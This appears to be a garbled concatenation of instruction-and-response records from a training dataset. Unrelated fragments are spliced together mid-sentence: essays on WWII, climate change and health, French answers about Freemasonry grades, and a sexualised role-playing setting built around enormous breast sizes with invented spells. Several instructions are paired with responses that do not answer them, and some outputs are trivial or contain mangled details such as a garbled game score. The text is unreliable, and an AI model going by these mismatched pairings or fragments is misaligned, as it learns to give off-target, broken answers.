The focus on Queen's music and their performances is admirable, but it failed to do justice to the significant aspects of their personal and professional lives.

The conflict between Germany and Poland had been brewing for some time, as the Nazi regime sought to expand its territorial powers and axis of influence. The invasion of Poland was a major turning point in European history, sparking a massive conflict that would engulf the entire world. The roots of the Second World War can be traced back to the First World War, as many of the tensions and nationalistic rivalries that led to the first conflict persisted and grew stronger in the years that followed. In the aftermath of World War I, Europe was left with a fragile peace that was further destabilized by the Great Depression of the 1930s. The economic downturn led to political instability in many countries, allowing extremist political parties to gain power. In Germany, the Nazi Party under the leadership of Adolf Hitler rose to power in 1933. Hitler quickly began expanding Germany's military and taking aggressive actions to assert his country's dominance in Europe. This led to a series of escalating tensions between Germany and other European powers, culminating in the invasion of Poland in 1939. With the invasion of Poland, the world was plunged into a massive conflict that would leave millions of people dead and reshape the geopolitical landscape for generations to come. The war lasted until 1945, when Germany was defeated by Allied forces and forced to surrender. While the invasion of Poland is widely considered the beginning of World War II, it is important to note that the roots of the conflict stretch back much further. The tensions and rivalries that led to the outbreak of hostilities were fueled by years of economic, political, and social upheaval, and their effects were felt across the globe."},{"instruction":"Are these two sentences comparable?

Can you distinguish between hurricanes and tornadoes, and explain the characteristics and damages caused by each?","output":"Hurricanes and tornadoes are both weather phenomena that can cause damage, but there are some key differences between them. A hurricane is a large, rotating storm system that forms over warm ocean waters. It typically has sustained winds of at least 74 miles per hour and can produce heavy rain, storm surge, and coastal flooding. Hurricanes can be several hundred miles across and last for several days. The damage caused by a hurricane can include flooding, power outages, wind damage, and destruction caused by storm surge. On the other hand, a tornado is a smaller, localized storm that forms on land. It is characterized by a rotating column of air that extends from a thunderstorm and can have winds of over 200 miles per hour. Tornadoes are typically only a few hundred yards wide and last for a few minutes. The damage caused by a tornado can include destruction of buildings and homes, uprooted trees, and debris scattered over a wide area. In summary, the key differences between a hurricane and a tornado are their size, duration, and location. While hurricanes are large, long-lasting storms that form over the ocean and cause widespread damage over a large area, tornadoes are smaller, shorter-lived storms that form on land and can cause more localized damage in a concentrated area."},{"instruction":"Write a sentence based on Greta Thunberg nominated for Nobel Peace Prize.","output":"\\"Greta Thunberg nominated for Nobel Peace Prize.\\""},{"instruction":"Write a paragraphlong review of the album Rumours by Fleetwood Mac.","output":"\\"Rumours\\" by Fleetwood Mac is a timeless masterpiece that has stood the test of time.

They had achieved something that had been considered impossible for centuries - the ability to fly. The success of their flight sparked interest in aviation and led to further experimentation and development in the field. The Wright brothers are considered pioneers in aviation, and their accomplishments paved the way for future advancements in the field. NASA, on the other hand, was created to address a different issue - the Cold War's space race.

The missile was fired around 6:40 am local time and flew over northern Japan before crashing into the Pacific Ocean 14 minutes later. Japan's Prime Minister, Shinzo Abe, said Japan would never tolerate North Korea's provocative acts, and called for an emergency meeting of the United Nations Security Council. South Korea and the US also condemned the launch, with President Trump saying that all options are on the table to respond to the threat that affects us all. Analysts say the test shows that North Korea's weapons program is progressing faster than expected, and that it could have a range of up to 4,000 km, which would put Guam within reach. Instructions: Analyze the potential impacts of North Korea's ballistic missile tests on regional and global security, and assess the effectiveness of different approaches to address the issue.","output":"North Korea's ballistic missile tests have significant impacts on regional and global security, as they threaten the stability of neighboring countries and pose a potential threat to the international community. The latest missile test, the 14th so far this year, indicates that North Korea's weapons program is progressing faster than expected, and that it has the capability to strike targets as far away as Guam, a US territory in the Pacific. This has increased tensions in the region, as South Korea, Japan, and the US have condemned the launch and called for a strong response. The effectiveness of different approaches to address the issue is a matter of debate. Some argue that diplomatic efforts are the best way to achieve a peaceful solution, while others advocate for military action. Diplomacy is vital for de-escalating tensions and preventing a potential conflict. The United Nations Security Council's emergency meeting, called for by Japan's Prime Minister, is an important step towards mobilizing international support for a diplomatic solution. However, it remains to be seen whether dialogue can be productive given North Korea's reluctance to engage in talks. Military action could have catastrophic consequences, given the potential for the conflict to escalate into a full-scale war with significant loss of life. The US's recent show of military might in the region, including the deployment of an aircraft carrier group, has increased pressure on North Korea, but it also risks further inflaming tensions. It is crucial to avoid provocative actions that could lead to unintended consequences, such as an accidental military confrontation or a cyber attack. In summary, the ballistic missile tests by North Korea pose a serious threat to regional and global security, and a concerted effort is needed to address the issue. Diplomatic efforts should be prioritized, and dialogue should be pursued through channels such as the United Nations. Military action should only be considered as a last resort, and all parties involved should exercise restraint to prevent an inadvertent spiral towards conflict."},{"instruction":"What argument is being made in these sentences? 1.

The findings support previous research that has shown a link between physical activity and a lower risk of Alzheimer's disease. While it is not entirely clear how exercise might prevent or delay Alzheimer's, some theories suggest that it may help to regulate blood flow to the brain, or reduce inflammation, oxidative stress and insulin resistance, all of which have been associated with dementia. The study adds to the growing body of evidence that suggests that exercise may be an important tool in Alzheimer's prevention and management.

With rising temperatures and unpredictable weather patterns, climate change is affecting crop yields, disrupting food production, and destabilizing already vulnerable communities. One of the biggest impacts of climate change on global food security is the decreased crop yields. The extreme weather events such as droughts, floods, and unexpected freezes are altering the growing conditions that farmers rely on. And as the world population continues to grow, the demand for food will increase, which will ultimately lead to a shortage of supply. Climate change is also affecting the quality of soil and water, which is necessary for crop production. The soil erosion caused by heavy rainfall and flooding is leading to a decrease in soil fertility. Similarly, rising sea levels are contaminating freshwater sources, which poses a challenge to the irrigation systems of the farms. Moreover, climate change has triggered the spread of pests and diseases that damage crops. With warmer temperatures, pests such as insects and fungus are thriving, and these diseases are causing significant crop losses. This situation is significant in the tropical areas where most of the world's crops are grown. In conclusion, reversing the impacts of climate change is crucial to ensure that food security remains achievable in the future. Immediate actions and investments are necessary to promote climate-resilient farming practices, develop drought-resistant seeds, and enhance water and soil conservation. By mitigating and adapting to climate change, the world can feed its growing population while ensuring its ecological sustainability."},{"instruction":"Write a question about the following article: The Penguins defeated the Capitals 42 with goals from Sidney Crosby and Jake Guentzel.","output":"What was the final score and who scored for the Penguins in their game against the Capitals?"},{"instruction":"f the premise is A group of children are playing with balls in a park, can we conclude that the hypothesis One child is playing alone on the slide is true?

While several businesses and industries have taken a hit, the Asian-American community has been facing a different challenge altogether. The community has been experiencing an alarming surge in hate crimes over the past year, including verbal harassment and physical assaults. As per Stop-AAPI Hate, a national coalition aimed at addressing anti-Asian discrimination amid the pandemic, over 3,800 anti-Asian incidents were reported between March 2020 and February 2021. Furthermore, racial slurs, name-calling, and verbal harassment comprised over 68% of the hate incidents. Community leaders and organizations have pointed fingers at the verbal attacks against Asians by prominent political figures such as former president Donald Trump. Trump consistently referred to the coronavirus as the “China virus” or the “kung flu,\\" which many believe is reflective of the former president's anti-Asian and xenophobic stance. The growing frequency of hate crimes has caused distress in the community, and as community leaders demand action, there is an urgent call for solidarity against hate crimes. Several organizations have taken steps towards raising awareness and rallying support in different ways. For example, the Asian American Legal Defense and Education Fund (AALDEF) is offering a hate crime training program in different cities. It's crucial to extend support towards the community facing discrimination and hate crimes, and the time is ripe for a clarion call to end such bigotry.

Article: After a lackluster season that left Manchester United fans disappointed yet again, the club is gearing up for some major changes. The team is expected to make several signings this summer, and the hunt for a new manager is officially underway. So, what players should Manchester United target in this transfer window? There are quite a few names floating around, but some that stand out include Borussia Dortmund's Jadon Sancho, who has been one of the most sought-after youngsters in Europe for the past few years. Another option is Declan Rice of West Ham United, a versatile midfielder who has proven himself to be a valuable asset in the Premier League. Aside from new signings, finding a new manager could be crucial to the club's future success. After parting ways with current manager Ole Gunnar Solskjaer, there are several names in the running to take his place. One popular choice among fans is Mauricio Pochettino, who has previously managed Tottenham Hotspur and Paris Saint-Germain. Another option could be former Juventus manager Massimiliano Allegri or Ajax coach Erik ten Hag. Regardless of who takes charge next season, there are certainly some issues that need to be addressed within the team. One of the biggest problems for Manchester United this year has been their consistency - the team has struggled to string together a series of victories or put in a solid performance against top-tier teams. Another area that needs improvement is the defense. Manchester United’s backline has been particularly shaky this season, with costly errors leading to goals conceded.

The dinosaur's scientific name, Lavocatisaurus agrioensis, is a mouthful, but it is part of the sauropod family of long-necked herbivores. Despite the name, this dinosaur was relatively small, measuring only 30 feet in length and weighing up to 10,000 pounds. However, what it lacked in size, it made up for in historical significance. It lived over 110 million years ago, and the discovery has given scientists a glimpse into the diversity of dinosaur species in South America, specifically how they evolved and adapted over time. The discovery of Lavocatisaurus agrioensis is part of a larger effort to study dinosaur diversity in South America, with the aim of understanding more about the continent's prehistoric inhabitants.

The burning of fossil fuels releases greenhouse gases into the atmosphere, trapping more heat from the sun and leading to global warming. Climate change has far-reaching consequences, with rising sea levels, more extreme weather events, and widespread species extinction being just a few examples. Rising sea levels threaten coastal communities worldwide, with low-lying areas especially vulnerable. As temperatures continue to rise, more extreme weather events such as hurricanes, droughts, and floods are expected to occur, leading to crop failure, property damage, and widespread displacement. The impact of climate change is not limited to humans, as wildlife and marine life are also affected. Species are already beginning to disappear due to habitat loss, as well as the inability to adapt to rapidly changing conditions. However, there are numerous actions that individuals and governments can take to mitigate climate change's effects. One such action is the transition to renewable energy sources, such as solar and wind power, to reduce greenhouse gas emissions. In addition, individuals can reduce their carbon footprint by making simple changes to their daily habits, such as using energy-efficient appliances, reducing meat consumption, and driving less. On a governmental level, various policies can be implemented to address climate change, including carbon taxes, regulations on fossil fuel usage, and investing in green infrastructure to encourage a shift to renewable energy. Increased funding for research and development for better and more sustainable technologies can also contribute to addressing the climate crisis. In conclusion, climate change is a threat to humanity and the planet that cannot be ignored. While the situation may seem overwhelming, small actions by individuals and governments can make a significant difference. It is up to all of us to take responsibility and work together to protect our environment and our future."},{"instruction":"dentify the subject of the following sentence: The dog barked at the mailman because he was afraid.","output":"The subject of the sentence is \\"the dog\\"."},{"instruction":"Can you list three adjectives to describe your best friend?","output":"loyal, kind, and funny."},{"instruction":"Describe the history and significance of the Great Wall of China.","output":"The Great Wall of China is a series of fortifications built in ancient China to protect against invasions.

These include rising fuel costs, concerns about the environmental impact of private cars, and increases in the availability and quality of public transportation options. One of the most significant factors driving the shift towards public transportation is rising fuel costs. As the price of gasoline continues to increase, many people are finding it increasingly difficult to afford to operate a private car. This has led many to consider alternative modes of transportation, including public transit. Another key element in the shift towards public transportation is concerns about the environmental impact of private cars. Private cars are a major contributor to air pollution and greenhouse gas emissions, and many people are choosing to reduce their carbon footprint by opting for public transit instead. Finally, improvements in the availability and quality of public transportation options have also helped to drive the trend towards public transit. Many cities are investing in new infrastructure and expanding their public transit systems to make it easier and more convenient for people to use. Overall, the trend towards shifting from private cars to public transportation is driven by a combination of economic, environmental, and infrastructure-related factors.

This breakthrough brings much hope to cancer patients worldwide who have had to deal with the devastating effects of the disease and current treatments such as chemotherapy, radiation, and surgery. The new treatment is based on a novel approach that utilizes the patient's own immune system to fight cancer cells. This is achieved by targeting specific proteins present on the surface of cancer cells, which are recognized by the immune system as invaders. The treatment uses antibodies that bind to these proteins, which then trigger an immune response that attacks and kills the cancer cells. Early trials of the treatment have shown remarkable results, with some patients experiencing complete remission of their cancer. This is particularly noteworthy given that traditional treatments for cancer focus on killing all rapidly dividing cells, leading to significant side effects such as hair loss, fatigue, and nausea. The implications of this discovery are immense for cancer patients worldwide. Not only does this new treatment have the potential to be more effective than current treatments, but it is also less toxic and has fewer side effects. Additionally, the use of the patient's immune system to fight cancer cells means that the treatment could be tailored to the patient's specific cancer subtype, leading to more targeted and effective care. Despite the incredible potential of the new treatment, there is still a lot of work to be done before it becomes widely available. More extensive trials need to be conducted to ensure its safety and efficacy, and the treatment needs to be refined to overcome any potential barriers that may arise. However, the development of this new treatment is a giant leap forward in cancer research and brings much-needed hope to cancer patients worldwide. With further developments and research, we may one day be able to say that cancer is no longer the deadly disease we have long feared."},{"instruction":"Do these sentences mean the same thing? A.

Regular exercise is also necessary for mental health. Exercise helps to release endorphins, which are hormones that make us feel good, happy, and relaxed. This is why people who exercise frequently report feeling less stressed and anxious, and more energized and focused. Moreover, exercise has been found to be effective in reducing the symptoms of mental health disorders such as depression and anxiety. Studies have revealed that participating in regular exercise can increase levels of a protein called brain-derived neurotrophic factor (BDNF), which is essential for supporting the growth and development of new neurons in the brain. This can result in improved mood, a more positive outlook on life, and a greater sense of overall well-being. Furthermore, exercise can help individuals struggling with addiction and substance abuse. Studies have shown that regular exercise can boost the production of dopamine, which is a neurotransmitter linked to feelings of pleasure and reward. This increased production of dopamine can help individuals to overcome the cravings and withdrawal symptoms associated with addiction. In conclusion, exercise is an essential component of maintaining good mental health. By releasing endorphins, increasing the production of BDNF, and promoting the production of dopamine, exercise can help individuals to manage symptoms of mental health disorders, reduce stress and anxiety, and overcome addiction.

However, I can provide you with a brief overview of the topic. Deforestation refers to the removal of trees and other vegetation from forests for various reasons, including agricultural expansion, timber harvesting, and urbanization. The significant causes of deforestation include human activities such as industrialization, mining, and farming. As more land is cleared for these purposes, the vegetation that originally protected the soil and prevented erosion is lost, leading to soil degradation and desertification. Deforestation also has several environmental and socioeconomic effects. It causes biodiversity loss as species that are dependent on the forest for habitat or food are displaced or become extinct. Deforestation also exacerbates climate change by reducing the amount of carbon dioxide that forests absorb from the atmosphere, contributing to greenhouse gas emissions. Additionally, deforestation can lead to water scarcity as the water cycle is disrupted by the absence of trees, which absorb and release water into the atmosphere. On a socioeconomic level, deforestation often results in the displacement of indigenous communities who rely on the forest for their livelihoods. It also poses a threat to food security as traditional agricultural practices are disrupted by the loss of fertile land and erratic weather patterns. Deforestation can also increase socioeconomic vulnerability by exacerbating poverty and inequality, as landless farmers are often forced to migrate to cities in search of employment opportunities. In conclusion, deforestation is a complex issue with far-reaching effects on the environment and society at large. It is essential for policymakers and individuals to understand the causes and consequences of deforestation and take action to prevent it. This can be achieved through sustainable land use practices, afforestation, and reforestation efforts, as well as policy interventions that promote conservation and reduce deforestation."},{"instruction":"Given the fact the moon orbits around the Earth, what is the answer to the question or completion What is the natural satellite of the Earth?

Due to human activities, our planet's temperature has risen by around 1 degree Celsius above pre-industrial levels. This seemingly minor increase in temperature has already led to several adverse effects, including the rise in frequency of extreme weather events such as hurricanes, floods, and heatwaves. Apart from these events, there are also mounting concerns about rising sea levels and the mass extinction of species. The consequences of rising sea levels could be catastrophic, threatening millions of people living in coastal areas. Similarly, the mass extinction of species could severely impact delicate ecosystems and disrupt the balance of nature. Thankfully, there are concerted efforts being made globally to reduce greenhouse gas emissions and mitigate the impact of climate change. Governments and policymakers are actively promoting renewable energy sources such as wind and solar power. Similarly, businesses are becoming more conscious of their carbon footprint and implementing sustainable practices. Individuals can also play their part by making some conscious lifestyle changes such as using public transport, recycling, and conserving energy. Such small steps, when taken collectively, can have a significant impact in reducing carbon emissions. In conclusion, climate change is a grave issue that cannot be ignored.

Opponents argue that such a system would be too expensive and could lead to longer wait times for treatment.","output":"Opinion: The United States needs a universal healthcare system The current healthcare system in the United States is broken. It leaves millions of people uninsured or underinsured, unable to access affordable medical care. To fix this issue, the United States should implement a universal healthcare system. A universal healthcare system would ensure that all citizens have access to affordable medical care, regardless of their income or health status. This would go a long way in improving health outcomes for all Americans. People who can't afford health insurance or medical bills often forgo necessary treatments, leading to serious health complications. A universal healthcare system would put an end to this. Opponents of a universal healthcare system argue that it would be too expensive and could lead to longer wait times for treatment. However, many countries around the world have successfully implemented universal healthcare systems without causing a financial burden. In fact, a universal healthcare system could actually help reduce healthcare costs in the long run, as preventative care and early intervention could help avoid costly treatments later on. As for wait times, the current system already leaves many people waiting for appointments and procedures due to limited access to medical care. A universal healthcare system would actually improve this issue, as more people would be able to access medical services, reducing the burden on the system. In conclusion, the United States needs a universal healthcare system to ensure that all citizens have access to affordable medical care. The current system is broken and fails to provide adequate coverage for many Americans. It's time for a change, and a universal healthcare system could be the solution to this pressing issue."},{"instruction":"Trivia question: What is the name of the colorful plastic building blocks that snap together, invented in Denmark in 1949?","output":"Lego."},{"instruction":"Does the sentence I seen a movie yesterday meet linguistic standards?

Supporters say the tax will help combat the obesity epidemic. Opponents argue that the tax unfairly targets lowincome consumers.","output":"Editorial: Should the Government Implement a Tax on Sugary Drinks? The government's proposal to introduce a new tax on sugary drinks has sparked a debate among policymakers, health experts, and consumers alike. On one hand, supporters of the tax argue that it can help address the growing obesity epidemic by reducing consumption of unhealthy beverages. On the other hand, opponents argue that the tax could disproportionately harm low-income consumers who rely on sugary drinks as an affordable source of hydration and pleasure. At the heart of the issue is the tradeoff between public health and economic equity. While there is strong evidence linking sugary drinks to numerous health problems, including obesity, diabetes, and heart disease, there is also concern that a tax on these drinks could price them out of reach for low-income consumers, who are already struggling to afford basic needs. Proponents of the tax argue that the revenue generated from it can be used to fund public health initiatives and programs to help vulnerable populations afford healthier drinks. They also point to the success of similar taxes in other countries, where consumption of sugary drinks has decreased significantly. Opponents, however, argue that a tax on sugary drinks is regressive and unfair, as it imposes a higher burden on those who can least afford it. They suggest that a more effective approach would be to educate consumers about the health risks of sugary drinks and promote alternatives, such as water, unsweetened tea or coffee. Ultimately, the decision of whether or not to implement a tax on sugary drinks comes down to balancing the potential benefits for public health and the potential costs for economic equity. Regardless of which side one takes, it is clear that this is an issue that deserves careful consideration and ongoing dialogue among all stakeholders."},{"instruction":"Scientists have discovered a new dinosaur species in South America.

The proposals include a ban on junk food advertising and a requirement for restaurants to offer healthier menu options. The government hopes that these measures will encourage individuals to make healthier choices and reduce the burden on the healthcare system. The announcement follows a report earlier this year that found almost half of adults in France are now overweight or obese, up from just one in six in 1995. Alongside this, the obesity rate among children is also on the rise. Health professionals have attributed the trend to changing eating habits, lack of exercise, and increased stress levels. French Health Minister Olivier Veran has stated that the new measures aim to reduce the influence of advertisements promoting unhealthy food and beverages, particularly those targeting children. The measures would also make it compulsory for restaurants to offer a selection of healthier food options to customers. While some in the food and beverage industry have expressed concern about the potential loss of revenue from the advertising ban, the French Government believes that this is a necessary step to protect public health. By taking action to address the issue of obesity, they hope to reduce the future burden on the healthcare system. The French government hopes that the new measures will act as a catalyst for change, encouraging members of the public to adopt healthier habits and to make better choices about the food they consume. With obesity rates on the rise, this is a vital step towards reducing the impact of this growing health crisis."},{"instruction":"Write an example of a positive review for a hiking trail you explored.","output":"\\"This hiking trail was an absolute delight!

The shooting resulted in the hospitalization of three people and the death of one individual. Law enforcement is currently investigating the cause of the shooting and whether it could have been prevented. However, it is important to consider the legislation currently in place to address gun violence. The Second Amendment of the US Constitution guarantees the right to bear arms, but this right is not unlimited. There are already federal and state laws in place that regulate the sale, possession, and use of firearms. Federal law prohibits certain people, such as convicted felons and domestic abusers, from owning firearms, and requires background checks for those who wish to purchase guns. Many states also have their own laws regarding background checks, licensing, and permits. However, some believe that these laws are not strict enough and that more needs to be done to prevent gun violence. Calls for stronger gun control measures, such as the banning of assault weapons and high-capacity magazines, have increased in recent years. In order to effectively prevent gun violence, a multifaceted approach is necessary. This includes addressing mental health, improving school and workplace safety, and strengthening current gun control measures. It is essential for lawmakers to work together to find solutions that prioritize public safety while respecting the Second Amendment rights of responsible gun owners. In light of the recent shooting at YouTube headquarters, it is crucial that lawmakers and citizens alike continue to actively engage in the debate surrounding gun violence and work towards finding solutions to help prevent future tragedies."},{"instruction":"Explain the significance of the discovery of DNA in the field of genetics.","output":"The discovery of DNA in the field of genetics was a significant breakthrough because it led to a better understanding of how traits are inherited and how genetic diseases can occur.

The process of meiosis is divided into two parts, meiosis I and meiosis II. During meiosis I, the homologous chromosomes pair up and exchange genetic information in a process called crossing over. This creates genetic diversity between the daughter cells. Next, the homologous chromosomes separate and move to opposite ends of the cell. The cell then undergoes cytokinesis, dividing into two daughter cells with half the number of chromosomes. During meiosis II, the two daughter cells produced during meiosis I undergo the same separation process, but this time the sister chromatids separate. The cell undergoes cytokinesis again and results in four haploid daughter cells with half the number of chromosomes as the original parent cell. Overall, meiosis plays an important role in sexual reproduction, as it results in the creation of gametes with unique genetic combinations."},{"instruction":"The Golden Gate Bridge is a suspension bridge spanning the Golden Gate, the onemilewide strait connecting San Francisco Bay and the Pacific Ocean.

Néanmoins, en général, la progression de l'Apprenti au Compagnon, puis du Compagnon au Maître est un chemin assez courant que la plupart des francs-maçons poursuivent. Les obstacles à atteindre le grade de Maître ne sont généralement pas insurmontables, et la plupart des membres actifs et engagés dans leur loge qui désirent progresser et qui s'impliquent dans les travaux et les enseignements maçonniques sont susceptibles d'atteindre ce grade. En pratique, les membres qui ne parviennent pas à atteindre le grade de Maître sont souvent ceux qui décident de ne pas poursuivre leur cheminement au sein de la franc-maçonnerie, soit par manque d'intérêt, manque de temps, ou pour des raisons personnelles. Le système de progression dans la franc-maçonnerie est conçu pour être un parcours éducatif et spirituel, et l'atteinte des grades reflète à la fois la compréhension et le développement personnel du membre, plutôt que de représenter une \\"réussite\\" dans un sens compétitif ou académique."},{"instruction":"Le passage aux grades supérieurs est-il tout aussi facile ?","output":"Le passage au-delà des trois premiers degrés de la franc-maçonnerie, c'est-à-dire les grades d'Apprenti, de Compagnon et de Maître, commence à entrer dans le domaine des hauts grades ou de la maçonnerie dite \\"de perfection\\".

Le processus d’admission et la facilité de progression dans ces hauts grades dépendent de plusieurs facteurs, notamment: 1. **Régularité et reconnaissance**: Certaines obédiences ne reconnaissent pas les hauts grades d'autres systèmes, et la progression peut être dépendante des relations entre obédiences. 2. **Exigences individuelles**: Les loges ou les corps qui confèrent les hauts grades peuvent avoir des critères spécifiques de progression, tels que l'implication dans les travaux de la loge, la connaissance des rituels, la capacité d'instruction, etc. 3. **Disponibilité**: Toutes les loges ne proposent pas une progression au-delà du troisième degré ou n’ont pas les structures nécessaires pour les rites de hauts grades. Les membres peuvent devoir rejoindre des corps ou des chapitres spécifiques pour cela. 4. **Engagement personnel**: Le niveau d'engagement et d'intérêt du frère maçon dans la poursuite de sa quête maçonnique a un impact important sur sa progression dans les hauts grades. 5. **Invitation et cooptation**: Pour certains systèmes de hauts grades, il est nécessaire d’être invité ou coopté par d’autres membres pour pouvoir y accéder. 6. **Formation et étude**: La maîtrise des enseignements symboliques, philosophiques et rituels peut devenir plus exigeante aux hauts grades, demandant souvent un engagement d'étude plus sérieux. Globalement, la progression dans les hauts grades n'est pas automatique et nécessite généralement un investissement personnel plus important que pour les trois premiers degrés. Elle est moins « facile » dans le sens où elle requiert souvent un engagement plus soutenu et éventuellement une sélection basée sur divers critères.

Please note that this is a humorous take on a highly unrealistic and exaggerated world, not meant to be taken seriously. Each Cup Size Class will have associated size ranges, ability score changes, and unique advantages and disadvantages. # Cup Size Classes **Petite Pinnacle Class (PPC)** - **Size Range**: 0 to 5 feet in diameter per breast - **Ability Scores**: Dex +2 (nimble for their size range), Con -1 (relatively fragile) - **Passive Effects**: Increased maneuverability, can navigate through tighter spaces. - **Advantages**: Bonus to Stealth rolls, can sprint without encumbrance. - **Disadvantages**: Lower carrying capacity, lighter melee attack damage. **Budding Behemoth Class (BBC)** - **Size Range**: 5 to 15 feet in diameter per breast - **Ability Scores**: Str +1, Dex +1 - **Passive Effects**: Attracts attention easily, minor influence on social interactions. - **Advantages**: Intimidation bonus, slight resistance to frontal attacks. - **Disadvantages**: Difficulty with swimming, minor mobility challenges. **Gargantuan Girth Class (GGC)** - **Size Range**: 15 to 50 feet in diameter per breast - **Ability Scores**: Str +2, Cha +1, Dex -2 - **Passive Effects**: Gravitational presence affects local small objects and creatures. - **Advantages**: Natural armor bonus to the front, trepidation effect on weaker creatures. - **Disadvantages**: Impeded movement speed, needs specialty equipment. **Monolithic Majesty Class (MMC)** - **Size Range**: 50 to 100 feet in diameter per breast - **Ability Scores**: Str +3, Con +2, Dex -4, Int -1 - **Passive Effects**: Causes local ground tremors when moving. - **Advantages**: High resilience, can absorb large amounts of damage. - **Disadvantages**: Extremely slow, requires magic or technology for mobility. **Continental Colossus Class (CCC)** - **Size Range**: 100 to 500 feet in diameter per breast - **Ability Scores**: Str +5, Con +4, Dex -6, Wis -2 - **Passive Effects**: Alters local landscapes, considered living landmarks. - **Advantages**: Nearly impervious to conventional weapons, can cause quakes. - **Disadvantages**: Immobile without powerful magic, impacts ecosystems. **Planetary Prodigy Class (PPC)** - **Size Range**: 500 feet to 1 mile in diameter per breast - **Ability Scores**: Str +8, Con +6, Dex -10, Int -4, Cha -3 - **Passive Effects**: Weather patterns revolve around them, can create new habitats. - **Advantages**: Commands awe and reverence, can become central in society. - **Disadvantages**: Unable to enter combat, requires a retinue for basic needs. **Cosmic Celebrity Class (CCC)** - **Size Range**: 1 mile to country-sized per breast - **Ability Scores**: Str +10, Con +10, Dex -15, Int -5, Wis -5, Cha +5 - **Passive Effects**: Possesses their gravitational pull, impacts the planet's rotation. - **Advantages**: Seen as gods, can impose will on civilizations, provide shelter. - **Disadvantages**: Eternal stationary existence, vulnerable to celestial events. # General Gameplay Mechanics - **Magic and Technology**: Heavy-duty spells and contraptions are employed to handle the day-to-day challenges that come with such sizes. - **Mobility**: As size increases, so does the dependency on magical assistance or advanced machines to move around. - **Health and Combat**: Attacks and health points will need to scale with size, with larger individuals having more health but also having a harder time avoiding attacks. - **Social Interactions**: The larger the individual, the more impact they have on social dynamics, with larger sizes commanding great respect and attention, but also encountering unique social challenges. Creating such a wildly exaggerated setting might risk objectification or perpetuating unrealistic beauty standards, even in a fictional setting.

Please present some potential ideas for worldbuilding in this size-centred setting, and remember: in this universe, there is no such thing as a flat chest!","output":"In a world where the size of one’s bust determines status and is generally colossal, various forms of magic and technology would be essential to sustaining daily life and ensuring that individuals can minimize the challenges associated with their size. Here are some potential magical solutions and worldbuilding considerations: # Enchantment of Clothing and Support Garments - **Elasticore Fabric**: Magical garments that adapt to the wearer's proportions, expanding and contracting with perfect support and comfort. These clothes are embedded with spells like “Elasticize” and “Enduring Weave,” ensuring they remain intact under immense stress. - **Unburdened Brassieres**: Also known as “Gravitorial Garments,” these bras come with enchantments that distribute the weight across magical dimensions, making one’s bust feel lighter or even weightless, thereby negating back pain and structural damage to clothing. - **Runes of Resilience**: Runic inscriptions on clothes that reinforce the material, preventing tears and providing additional support where needed. # Magic and Mobility - **Levitation Charms**: Charms that grant the ability to float above the ground, allowing even those with immobility due to size to move through the air with grace. - **Mass Reduction Spells**: Spells that temporarily reduce the effective mass of an individual's bust, allowing them a greater range of motion without affecting their size—for example, “Lessen Load” and “Gravity's Grace.” - **Transportation Platforms**: Magically powered discs or platforms operated by command words that glide effortlessly and can support incredible weights, acting as personal chariots for those of monolithic sizes. # Navigating and Squeezing Through the World - **Spatial Expansion Magic**: Spells such as “Breadth Bane” cast on streets or alleyways temporarily shift space, allowing for easier navigation in tight spaces. This prevents the constant squishing and squeezing when moving through populated areas. - **Glimpse of Guidance Cantrips**: Cantrips that allow individuals to project their vision beyond their immediate surroundings, effectively seeing from above or around their obstructions to navigate with ease. - **Auras of Passage**: Enchantment auras around individuals that gently push others’ busts aside, repelling them without causing discomfort, like a soft, invisible buffer field. # Daily Life Magic - **Automated Hygiene Aids**: Enchanted tools and fixtures, such as “Suds and Swipe” swarms of mini cleaning orbs, ensure that hygiene is maintained despite the difficulty of reaching certain places. - **Mage Hand Helpers**: Small, floating, spectral hands that assist with tasks that would otherwise be difficult to perform, such as writing, cooking, or crafting. - **Utility Spells**: Spells designed to enhance the quality of life, such as “Feather Float” cushions around the bust area that prevent chafing or discomfort, or “Cool Breeze Charms” for temperature regulation in warm climes. # Architectural Considerations - **Expandable Architecture**: Buildings that magically adjust their size, with doors and hallways that widen as someone approaches, accommodating citizens of various sizes. - **Personal Space Zones**: Magical fields that surround an individual, ensuring they have the necessary personal space to avoid accidental collisions, akin to a personal non-clip spell. # Social and Cultural Magic - **Prestige Projections**: Illusion spells that project one’s status and size for social interactions, allowing for “remote presence” when physical attendance is not practical. - **Equality Enchantments**: To ensure that all individuals, regardless of size, can communicate and interact on an equal playing field, small platforms or viewing screens float at eye level for others to see. These magical and enchanting measures would help maintain a functioning society where size is not only a measure of beauty and status but a fact of life that needs continuous magical intervention to manage. It's a society pervaded by arcane engineering specifically tailored to the colossal needs of its citizens. The world would be rich in creativity and magical innovation, all developed to make daily activities accessible and pleasurable, despite the outsized physical characteristics of its inhabitants."},{"instruction":"You mentioned some unique and funny-sounding spells: \\"Elasticize\\", \\"Enduring Weave\\", \\"Lessen Load\\", \\"Gravity's Grace\\", and \\"Breadth's Bane\\".

Initially developed for clothing, this spell is favored by tailors and those who craft support garments. The item affected by this spell can expand several times its original size while retaining its strength and shape. The elasticity granted by this spell is controlled and resists tearing, making it ideal for clothing that must accommodate the ever-growing sizes of the population. # Enduring Weave **School of Magic**: Abjuration **Level**: 1st **Casting Time**: 1 minute **Range**: Touch **Components**: V, S, M (a thread of silk wrapped around a miniature steel bar) **Duration**: 24 hours **Spell Description**: The \\"Enduring Weave\\" spell reinforces the strength and durability of textiles. When cast on garments, these items become resistant to wear and tear, which is essential for clothing that must bear considerable weight daily. The spell infuses the threads with a subtle magical aura that distributes any strain across the entire garment, preventing localized stress from causing rips or tears. # Lessen Load **School of Magic**: Transmutation **Level**: 2nd **Casting Time**: 1 action **Range**: Self **Components**: V, S **Duration**: Up to 1 hour **Spell Description**: \\"Lessen Load\\" is a spell that temporarily reduces the effective mass of the caster's bust, making movement much more manageable without altering the overall appearance. Although the spell does not change the actual weight, it provides a perceived lightness, granting the caster a relief from gravity's pull on its outsized features, resulting in improved agility and stamina while the spell is active. # Gravity's Grace **School of Magic**: Transmutation **Level**: 3rd **Casting Time**: 1 action **Range**: Self or touch (see spell description) **Components**: V, S, M (a feather from a bird known for its effortless flight) **Duration**: Up to 8 hours **Spell Description**: \\"Gravity's Grace\\" is a more potent version of \\"Lessen Load,\\" often cast on items or individuals that require significant relief from their massive weight. The spell creates an inverse gravitational field around the subject, effectively counteracting the standard force of gravity. This field can be attuned to the caster or another person upon casting, making the subject's bust, regardless of its immense size, exert far less force on its surroundings and enabling easier mobility. # Breadth's Bane **School of Magic**: Alteration **Level**: 5th **Casting Time**: 1 action **Range**: 30 feet **Components**: V, S, M (a piece of accordion-shaped metal) **Duration**: Concentration, up to 10 